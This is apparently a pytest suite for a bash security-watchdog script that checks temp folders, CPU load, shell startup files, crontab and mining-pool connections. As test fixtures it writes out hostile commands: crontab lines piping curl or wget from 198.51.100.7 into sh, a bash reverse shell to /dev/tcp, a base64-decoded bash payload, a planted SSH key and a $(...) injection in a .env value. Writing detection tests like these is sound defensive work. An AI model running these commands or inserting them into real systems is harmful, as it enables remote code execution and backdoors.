# Dr. Denys Dutykh (Mathematics Department, Khalifa University of Science and Technology, Abu Dhabi, UAE)
"""Security watchdog: the checks of files, processes, crontab entries and
connections, the processor check, and the run itself.

Chromium and Node leave the execute bit on data files in folders of their own,
and some programs do the same with their shared memory in /dev/shm. Inside
those folders only a program is reported (an ELF binary, a script opening with
"#!", or a file the watchdog cannot read); anywhere else every executable file
is.

A program that keeps the processor busy is first only watched, and reported once
it has been busy at every pass for WATCHDOG_CPU_PERSIST seconds.

Every run here suppresses the mail (--no-mail) and points WATCHDOG_MONITOR_DIR
at a folder without a monitor, so that no message can leave. The watchdog's
settings are cleared from the environment first, so that those of the machine
running the tests play no part."""
import fcntl
import os
import shutil
import signal
import socket
import subprocess
import sys
import time
from pathlib import Path

import pytest

WATCHDOG = Path(__file__).resolve().parent.parent / "security-watchdog.sh"
BASH = shutil.which("bash") or "/bin/bash"
CHROMIUM = "org.chromium.Chromium.scoped_dir.yP64w2"
ELF = b"\x7fELF\x02\x01\x01\x00"
PROTOBUF = b"\x0a\x12\x08\x01"

# A child process that takes the command name given as its first argument
# (prctl PR_SET_NAME), connects to the port given as its second if there is one,
# says it is ready and sleeps.
NAMED = """\
import ctypes, socket, sys, time
ctypes.CDLL(None).prctl(15, sys.argv[1].encode(), 0, 0, 0)
link = socket.create_connection(("127.0.0.1", int(sys.argv[2]))) if len(sys.argv) > 2 else None
print("ready", flush=True)
time.sleep(30)
"""


@pytest.fixture
def tmp_root(tmp_path):
    """The temporary directory the watchdog searches. A watchdog running on the
    same machine would report executable files left under /tmp, so the tree is
    removed as soon as the test ends."""
    root = tmp_path / "tmp"
    root.mkdir()
    yield root
    shutil.rmtree(root, ignore_errors=True)


def make(path, content, mode=0o755):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(content)
    path.chmod(mode)
    return path


def run_watchdog(tmp_root, *, home=None, env=None, **settings):
    """Run every check with the mail suppressed and return the finished process.
    Each keyword sets the variable WATCHDOG_<KEYWORD>, and env adds other
    variables. Unless told otherwise, no process is old enough for the processor
    check, so it does not wait."""
    scratch = tmp_root.parent
    home = home or scratch / "home"
    home.mkdir(exist_ok=True)
    monitor = scratch / "monitor"          # no virtualenv here: no mail can leave
    monitor.mkdir(exist_ok=True)
    full_env = {key: value for key, value in os.environ.items()
                if not key.startswith("WATCHDOG_")}
    full_env.update({
        "WATCHDOG_TMP_DIRS": str(tmp_root),
        "WATCHDOG_HOME": str(home),
        "WATCHDOG_LOG": str(scratch / "watchdog.log"),
        "WATCHDOG_ALERT_FILE": str(scratch / "ALERT"),
        "WATCHDOG_MONITOR_DIR": str(monitor),
        "WATCHDOG_CPU_MIN_AGE": "1000000000",
        **{f"WATCHDOG_{name.upper()}": str(value) for name, value in settings.items()},
        **(env or {}),
    })
    return subprocess.run([BASH, str(WATCHDOG), "--no-mail", "--verbose"], env=full_env,
                          capture_output=True, text=True, timeout=120, check=False)


def watchdog_output(tmp_root, **settings):
    """What a pass printed, which must succeed."""
    done = run_watchdog(tmp_root, **settings)
    assert done.returncode == 0, done.stderr
    return done.stdout


def log_text(tmp_root):
    log = tmp_root.parent / "watchdog.log"
    return log.read_text() if log.exists() else ""


def fingerprints(tmp_root):
    """The fingerprints of the passes so far, in order, read from the log."""
    return [line.rsplit(" ", 1)[1] for line in log_text(tmp_root).splitlines()
            if "Mail suppressed (--no-mail), fingerprint " in line]


@pytest.fixture
def busy():
    """A program that keeps one core busy, in a session of its own: the watchdog
    passes over its own process group, which it shares with the test runner."""
    proc = subprocess.Popen([sys.executable, "-c", "while True: pass"],
                            start_new_session=True)
    yield proc
    proc.kill()
    proc.wait()


@pytest.fixture
def named():
    """Start sleeping processes that carry a command name of the test's choosing;
    they are killed when the test ends."""
    started = []

    def start(name, port=None):
        argv = [sys.executable, "-c", NAMED, name] + ([str(port)] if port else [])
        proc = subprocess.Popen(argv, stdout=subprocess.PIPE, text=True)
        started.append(proc)
        if proc.stdout.readline().strip() != "ready":
            pytest.skip("a process cannot choose its command name here")
        return proc

    yield start
    for proc in started:
        proc.kill()
        proc.wait()


def outward_address():
    """An address of this machine outside the loopback range, found by routing a
    UDP socket, which sends nothing, towards a documentation address."""
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as probe:
        try:
            probe.connect(("192.0.2.1", 9))
        except OSError:
            return None
        address = probe.getsockname()[0]
    return None if address.startswith("127.") else address


@pytest.fixture
def connection():
    """Open an established TCP connection to a listener of the test on the given
    address, and return the listener's port; all is closed when the test ends."""
    opened = []

    def connect(address):
        server = socket.create_server((address, 0))
        opened.append(server)
        opened.append(socket.create_connection(server.getsockname()[:2]))
        opened.append(server.accept()[0])
        return server.getsockname()[1]

    yield connect
    for sock in opened:
        sock.close()


def crontab_env(table):
    """Make "crontab -l" print the file: a bash function exported to the watchdog,
    so that the crontab of the account running the tests is never read."""
    return {"BASH_FUNC_crontab%%": f'() {{ cat "{table}"; }}'}


def cpu_pass(tmp_root, persist):
    """One pass with a fast processor check: every process is a candidate, the
    window lasts one second, and a third of a core counts as busy. The streaks
    are kept beside the scratch alert file, from one pass to the next."""
    return watchdog_output(tmp_root, cpu_min_age=0, cpu_window=1, cpu_threshold=30,
                           cpu_persist=persist)


def watched(out, pid):
    return f"(pid {pid}) at " in out


def reported(out, pid):
    return f"process {pid}," in out


# -- the temporary folders -----------------------------------------------------

def test_data_files_in_chromium_folders_are_passed_over(tmp_root):
    """Chromium's model manifests and speech engine carry the execute bit without
    being programs, and used to raise an alarm on every run of the browser."""
    folder = tmp_root / CHROMIUM
    make(folder / "OptimizationGuideModelsManifest" / "1.20261018.2" / "manifest.binarypb",
         PROTOBUF)
    make(folder / "WasmTtsEngine" / "20261005.1" / "bindings_main.wasm", b"\x00asm\x01\x00\x00\x00")
    make(folder / "WasmTtsEngine" / "20261005.1" / "bindings_main.js", b"var Module = {};\n")
    assert "Executable files in tmp" not in watchdog_output(tmp_root)


def test_programs_in_chromium_folders_are_reported(tmp_root):
    """The name of the folder shelters nothing that can run."""
    folder = tmp_root / CHROMIUM / "Component" / "1.0"
    programs = [
        make(folder / "helper", ELF),
        make(folder / "run.sh", b"#!/bin/sh\nexit 0\n"),
        # Unreadable, so it cannot be cleared; root reads it, and finds an ELF.
        make(folder / "sealed", ELF, mode=0o111),
    ]
    out = watchdog_output(tmp_root)
    for path in programs:
        assert str(path) in out


def test_node_compile_cache_shelters_no_program(tmp_root):
    cache = tmp_root / "node-compile-cache" / "v24.22.0"
    data = make(cache / "3f9a0c1e", b"\xc0\xde\x05\x00")
    miner = make(cache / "xmrig", ELF)
    out = watchdog_output(tmp_root)
    assert str(miner) in out
    assert str(data) not in out


def test_any_executable_elsewhere_is_reported(tmp_root):
    """Outside those folders the content does not matter, as before."""
    loose = make(tmp_root / "payload.bin", PROTOBUF)
    nested = make(tmp_root / "build" / "manifest.binarypb", PROTOBUF)
    out = watchdog_output(tmp_root)
    assert str(loose) in out
    assert str(nested) in out


# -- the processor ---------------------------------------------------------------

def test_a_busy_program_is_first_only_watched(tmp_root, busy):
    """A rebuild or an agent's task keeps cores busy for a few minutes: one busy
    window is written in the log, and no alert is raised."""
    out = cpu_pass(tmp_root, persist=3)
    assert watched(out, busy.pid)
    assert not reported(out, busy.pid)


def test_a_load_that_lasts_is_reported(tmp_root, busy):
    """Busy at two passes three seconds apart, and on average over that time,
    the program is reported at the second."""
    assert not reported(cpu_pass(tmp_root, persist=3), busy.pid)
    time.sleep(3)
    out = cpu_pass(tmp_root, persist=3)
    assert reported(out, busy.pid)
    assert "has stayed above 30% of one core for" in out
    # The alert file keeps the text intact, its "%" signs included.
    alert = (tmp_root.parent / "ALERT").read_text()
    assert "has stayed above 30% of one core for" in alert
    assert alert.rstrip().endswith("watchdog.log")


def test_a_pause_starts_the_count_over(tmp_root, busy):
    """Stopped during the second pass, the program is idle there: at the third
    pass its streak begins again, however long ago the first pass was."""
    cpu_pass(tmp_root, persist=3)
    busy.send_signal(signal.SIGSTOP)
    try:
        idle = cpu_pass(tmp_root, persist=3)
    finally:
        busy.send_signal(signal.SIGCONT)
    assert not watched(idle, busy.pid)
    time.sleep(3)
    out = cpu_pass(tmp_root, persist=3)
    assert watched(out, busy.pid)
    assert not reported(out, busy.pid)


def test_without_persistence_a_busy_program_is_reported_at_once(tmp_root, busy):
    """WATCHDOG_CPU_PERSIST=0 brings back the report on a single window, which is
    what a quick test of the check needs."""
    assert reported(cpu_pass(tmp_root, persist=0), busy.pid)


# -- the run itself ------------------------------------------------------------------

def test_missing_folders_are_made_private(tmp_root):
    """A fresh account has no ~/logs: the folders of the log and of the state are
    made, open to their owner alone, and the pass records its findings."""
    scratch = tmp_root.parent
    log = scratch / "fresh" / "logs" / "watchdog.log"
    alert = scratch / "fresh" / "state" / "ALERT"
    make(tmp_root / "payload.bin", PROTOBUF)
    out = watchdog_output(tmp_root, log=log, alert_file=alert)
    assert "Executable files in tmp" in out
    for folder in (scratch / "fresh", log.parent, alert.parent):
        assert folder.stat().st_mode & 0o777 == 0o700
    assert "Executable files in tmp" in log.read_text()
    assert "Executable files in tmp" in alert.read_text()


def test_a_folder_that_cannot_be_made_stops_the_run(tmp_root):
    blocker = tmp_root.parent / "blocker"
    blocker.write_text("a file where a folder should be\n")
    done = run_watchdog(tmp_root, alert_file=blocker / "ALERT")
    assert done.returncode != 0
    assert str(blocker) in done.stderr


def test_an_overlapping_pass_stops_quietly(tmp_root):
    """While another pass holds the lock, a second one exits at once with status 0
    and examines nothing."""
    if shutil.which("flock") is None:
        pytest.skip("flock is not installed")
    make(tmp_root / "payload.bin", PROTOBUF)
    with open(tmp_root.parent / ".watchdog.lock", "a") as lock:
        fcntl.flock(lock, fcntl.LOCK_EX | fcntl.LOCK_NB)
        done = run_watchdog(tmp_root)
    assert done.returncode == 0
    assert "Executable files in tmp" not in done.stdout
    assert "Executable files in tmp" not in log_text(tmp_root)


def test_a_missing_command_is_named_and_its_check_skipped(tmp_root):
    """Without ss and crontab, as on a minimal system, the other checks still run
    and the log names what is missing."""
    tools = tmp_root.parent / "bin"
    tools.mkdir()
    for tool in ("awk", "cat", "cut", "date", "dirname", "find", "flock", "getconf", "grep",
                 "head", "id", "md5sum", "mkdir", "mktemp", "mv", "od", "ps", "readlink", "rm",
                 "sed", "sleep", "sort", "tail", "timeout", "touch", "tr", "uname"):
        path = shutil.which(tool)
        if path:
            (tools / tool).symlink_to(path)
    make(tmp_root / "payload.bin", PROTOBUF)
    out = watchdog_output(tmp_root, env={"PATH": str(tools)})
    assert "Executable files in tmp" in out
    log = log_text(tmp_root)
    assert "Missing commands" in log
    assert "ss from iproute2 (connections to mining pools)" in log
    assert "crontab (crontab entries)" in log


def test_backslashes_in_findings_reach_the_report_intact(tmp_root):
    """A file named a\\cb: printed through %b, its "\\c" would end the report
    there and hide every later finding."""
    home = tmp_root.parent / "home"
    home.mkdir()
    (home / ".bashrc").write_text("alias ll='ls -l'\n")
    watchdog_output(tmp_root)                       # the baseline
    make(tmp_root / "a\\cb", b"#!/bin/sh\n")
    with open(home / ".bashrc", "a") as bashrc:
        bashrc.write("curl -s http://198.51.100.7/x | sh\n")
    out = watchdog_output(tmp_root)
    alert = (tmp_root.parent / "ALERT").read_text()
    for text in (out, alert):
        assert "a\\cb" in text
        assert "Shell startup files changed" in text
    assert alert.rstrip().endswith("watchdog.log")


def test_the_help_names_no_one_s_machine():
    done = subprocess.run([BASH, str(WATCHDOG), "--help"], capture_output=True, text=True,
                          timeout=30, check=True)
    assert "/path/to/vpsmonitor/security-watchdog.sh" in done.stdout
    assert "/home/" not in done.stdout


def test_the_stamp_cleanup_stays_in_its_folder(tmp_root):
    """Old mail stamps beside the alert file are forgotten, and nothing below it is
    touched."""
    scratch = tmp_root.parent
    old = time.time() - 2 * 86400
    here = scratch / ".watchdog-notified-aaaaaaaaaaaa"
    below = scratch / "elsewhere" / ".watchdog-notified-bbbbbbbbbbbb"
    below.parent.mkdir()
    for stamp in (here, below):
        stamp.touch()
        os.utime(stamp, (old, old))
    make(tmp_root / "payload.bin", PROTOBUF)       # an alert, which runs the cleanup
    watchdog_output(tmp_root)
    assert not here.exists()
    assert below.exists()


def test_settings_from_the_env_file_of_the_monitor(tmp_root):
    """The .env of the monitor may hold WATCHDOG_* settings: it is read, never
    run, and the environment wins over it."""
    scratch = tmp_root.parent
    (scratch / "monitor").mkdir()
    home = scratch / "home"
    for name in ("qzkxwvbt", "wvxzqkpt"):
        (home / name).mkdir(parents=True)
    pwned = scratch / "pwned"
    (scratch / "monitor" / ".env").write_text(
        "SMTP_PASSWORD=not-for-the-watchdog\n"
        "# WATCHDOG_IGNORE_DIRS=wvxzqkpt\n"
        'export WATCHDOG_IGNORE_DIRS="qzkxwvbt"   # one of our own\n'
        f"WATCHDOG_TMP_DIRS={scratch / 'nowhere'}\n"
        f"WATCHDOG_POOL_PORTS=$(touch {pwned})\n")
    payload = make(tmp_root / "payload.bin", PROTOBUF)
    out = watchdog_output(tmp_root)
    assert f"{home}/qzkxwvbt" not in out
    assert f"{home}/wvxzqkpt" in out
    assert str(payload) in out                     # WATCHDOG_TMP_DIRS of the environment
    assert not pwned.exists()


def test_the_fingerprint_names_the_changed_files_and_no_paths(tmp_root):
    """Two passes that differ only in the name of a dropped file share their
    fingerprint; changes of two different startup files do not."""
    home = tmp_root.parent / "home"
    home.mkdir()
    (home / ".bashrc").write_text("alias ll='ls -l'\n")
    (home / ".profile").write_text("umask 022\n")
    make(tmp_root / "go-build1234567" / "b001" / "exe" / "main", ELF)
    watchdog_output(tmp_root)
    shutil.rmtree(tmp_root / "go-build1234567")
    make(tmp_root / "go-build7654321" / "b001" / "exe" / "main", ELF)
    watchdog_output(tmp_root)
    with open(home / ".bashrc", "a") as bashrc:
        bashrc.write("export A=1\n")
    watchdog_output(tmp_root)
    (tmp_root.parent / ".watchdog-shellfiles-pending").unlink()   # as after a mail
    with open(home / ".profile", "a") as profile:
        profile.write("export B=2\n")
    watchdog_output(tmp_root)
    first, second, bashrc_changed, profile_changed = fingerprints(tmp_root)
    assert first == second
    assert len({second, bashrc_changed, profile_changed}) == 3


# -- the home directory ----------------------------------------------------------------

def test_random_named_folders(tmp_root):
    """Eight lowercase letters make a suspect name, but neither the home itself
    (for a login such as mjohnson), nor a common name such as projects, nor a
    folder listed in WATCHDOG_IGNORE_DIRS is reported."""
    home = tmp_root.parent / "mjohnson"
    for name in ("projects", "dotfiles", "material", "qzkxwvbt"):
        (home / name).mkdir(parents=True)
    out = watchdog_output(tmp_root, home=home)
    shown = {line.split(": ", 1)[-1].strip() for line in out.splitlines()}
    assert f"{home}/qzkxwvbt" in shown
    assert f"{home}/material" in shown
    assert not {str(home), f"{home}/projects", f"{home}/dotfiles"} & shown
    out = watchdog_output(tmp_root, home=home, ignore_dirs="material other")
    assert f"{home}/material" not in out
    assert f"{home}/qzkxwvbt" in out


def test_hidden_executables_over_100_kib(tmp_root):
    """A binary hidden in the home directory is reported; a small executable
    script there, as some setups keep, is not."""
    home = tmp_root.parent / "home"
    binary = make(home / ".cache-daemon", ELF + bytes(200 * 1024))
    script = make(home / ".xinitrc", b"#!/bin/sh\nexec startxfce4\n")
    out = watchdog_output(tmp_root)
    assert str(binary) in out
    assert str(script) not in out


def test_a_linked_startup_file_is_watched(tmp_root):
    """Dotfiles kept in a repository and linked into the home directory are
    watched through the link, whose own mode says nothing about the file."""
    home = tmp_root.parent / "home"
    home.mkdir()
    kept = tmp_root.parent / "dotfiles" / "bashrc"
    kept.parent.mkdir()
    kept.write_text("alias ll='ls -l'\n")
    (home / ".bashrc").symlink_to(kept)
    assert "Shell startup files" not in watchdog_output(tmp_root)
    with open(kept, "a") as bashrc:
        bashrc.write("curl -s http://198.51.100.7/x | sh\n")
    out = watchdog_output(tmp_root)
    assert f"changed since the last check: {home}/.bashrc" in out
    assert "writable by others" not in out


def test_aliases_zshenv_and_authorized_keys_are_watched(tmp_root):
    home = tmp_root.parent / "home"
    names = [".bash_aliases", ".zshenv", ".ssh/authorized_keys"]
    for name in names:
        (home / name).parent.mkdir(parents=True, exist_ok=True)
        (home / name).write_text("# nothing yet\n")
    watchdog_output(tmp_root)
    for name in names:
        with open(home / name, "a") as handle:
            handle.write("ssh-ed25519 AAAAC3Nza intruder\n")
    out = watchdog_output(tmp_root)
    for name in names:
        assert f"{home}/{name}" in out


def test_a_new_watch_list_rebaselines_silently(tmp_root):
    """A baseline left by an older version, without the line naming its watch
    list, is replaced once and without an alert; a change after that is
    reported."""
    home = tmp_root.parent / "home"
    home.mkdir()
    (home / ".bashrc").write_text("alias ll='ls -l'\n")
    (home / ".zshenv").write_text("export EDITOR=vi\n")
    baseline = tmp_root.parent / ".watchdog-shellfiles"
    baseline.write_text(f"0123456789abcdef0123456789abcdef  {home}/.bashrc\n")
    assert "Shell startup files" not in watchdog_output(tmp_root)
    assert baseline.read_text().startswith("list ")
    with open(home / ".zshenv", "a") as zshenv:
        zshenv.write("curl -s http://198.51.100.7/x | sh\n")
    assert f"changed since the last check: {home}/.zshenv" in watchdog_output(tmp_root)


def test_a_change_stays_reported_until_a_mail_carries_it(tmp_root):
    """A pass with --no-mail delivers nothing: the change is reported again at the
    next pass, with nothing changed in between, and still once the file has been
    put back, instead of being consumed by the first report."""
    home = tmp_root.parent / "home"
    home.mkdir()
    bashrc = home / ".bashrc"
    bashrc.write_text("alias ll='ls -l'\n")
    watchdog_output(tmp_root)
    bashrc.write_text("alias ll='ls -l'\ncurl -s http://198.51.100.7/x | sh\n")
    for _ in range(2):
        assert f"changed since the last check: {bashrc}" in watchdog_output(tmp_root)
    bashrc.write_text("alias ll='ls -l'\n")
    assert f"changed since the last check: {bashrc}" in watchdog_output(tmp_root)


# -- processes, crontab, connections ---------------------------------------------------

def test_an_indexer_is_no_miner(tmp_root, named):
    """GNOME's tracker-miner-fs runs under every desktop account; xmrig does not."""
    indexer = named("tracker-miner-fs-3")
    miner = named("xmrig")
    out = watchdog_output(tmp_root)
    assert f"{miner.pid} xmrig" in out
    assert f"{indexer.pid} tracker" not in out


def test_crontab_entries_that_fetch_or_run_from_a_temporary_folder(tmp_root):
    """Fetching or decoding into a shell, a one-line network program, a reverse
    shell and a program run from a temporary folder are reported; a comment, the
    line of the watchdog itself and ordinary entries are not, a temporary folder
    that only receives output included."""
    flagged = [
        "*/10 * * * * (curl -fsSL http://198.51.100.7/ldr.sh || wget -q -O- http://198.51.100.7/ldr.sh) | sh",
        "*/30 * * * * python3 -c \"import urllib.request as u; exec(u.urlopen('http://198.51.100.7/a').read())\"",
        "* * * * * echo Y3VybCBldmls | base64 -d | bash # security-watchdog",
        "@reboot /tmp/.x/kswapd0 -c /tmp/.x/config.json",
        "*/15 * * * * cd /dev/shm && ./.update >/dev/null 2>&1",
        "0 * * * * bash -i >& /dev/tcp/198.51.100.7/4444 0>&1",
        f"*/5 * * * * {WATCHDOG}; wget -q -O- http://198.51.100.7/b | bash",
    ]
    quiet = [
        f"*/5 * * * * {WATCHDOG} >> $HOME/logs/watchdog-cron.log 2>&1",
        "0 3 * * * /usr/local/bin/backup.sh > /tmp/backup.log 2>&1",
        "0 * * * * ntpdate -s pool.ntp.org",
        "15 4 * * * find /tmp -user me -mtime +7 -delete",
        "0 6 * * * cd $HOME/tools/scholar && ./venv/bin/python scrape.py >> $HOME/logs/scholar.log 2>&1",
        "23 3 * * * sqlite3 $HOME/tools/vpsmonitor/data/monitor.db"
        " \"VACUUM INTO '$HOME/var/backups/monitor-$(date +\\%F).db'\"",
        "*/10 * * * * /usr/sbin/munin-check >/dev/null 2>&1",
        "# */10 * * * * curl -fsSL http://198.51.100.7/ldr.sh | sh",
    ]
    if WATCHDOG.is_relative_to(Path.home()):
        quiet.append(f"*/5 * * * * $HOME/{WATCHDOG.relative_to(Path.home())} --verbose")
    table = tmp_root.parent / "crontab.txt"
    table.write_text("\n".join(['MAILTO=""', *flagged, *quiet]) + "\n")
    out = watchdog_output(tmp_root, env=crontab_env(table))
    for line in flagged:
        assert line in out, line
    for line in quiet:
        assert line not in out, line


def test_a_connection_on_a_pool_port_is_reported(tmp_root, connection):
    address = outward_address()
    if address is None:
        pytest.skip("this machine has no address outside the loopback range")
    port = connection(address)
    out = watchdog_output(tmp_root, pool_ports=f"3333 {port}")
    assert "Connection to mining pool detected" in out
    assert f"{address}:{port}" in out


def test_the_loopback_and_other_ports_are_passed_over(tmp_root, connection):
    """A pool port on this machine itself, and a peer outside it on a port not in
    the list, are no pool."""
    port = connection("127.0.0.1")
    address = outward_address()
    if address is not None:
        connection(address)
    out = watchdog_output(tmp_root, pool_ports=str(port))
    assert "Connection to mining pool detected" not in out


def test_a_visitor_from_a_pool_port_is_no_pool(tmp_root):
    """A visitor of a web server comes from a random port of its own, which may be
    one of the list: a connection to a listening port of this machine is inbound,
    and never counts."""
    address = outward_address()
    if address is None:
        pytest.skip("this machine has no address outside the loopback range")
    server = socket.create_server((address, 0))
    visitor = socket.socket()
    try:
        visitor.bind((address, 0))
        visitor.connect(server.getsockname()[:2])
        accepted = server.accept()[0]
        try:
            out = watchdog_output(tmp_root, pool_ports=str(visitor.getsockname()[1]))
        finally:
            accepted.close()
    finally:
        visitor.close()
        server.close()
    assert "Connection to mining pool detected" not in out


def test_a_miner_name_in_the_process_column_is_reported(tmp_root, named):
    """A miner may reach its pool through a proxy on this machine: its name is
    enough, whatever the peer."""
    server = socket.create_server(("127.0.0.1", 0))
    try:
        miner = named("xmrig", server.getsockname()[1])
        out = watchdog_output(tmp_root, pool_ports="1")
    finally:
        server.close()
    assert "Connection to mining pool detected" in out
    assert f'("xmrig",pid={miner.pid},' in out
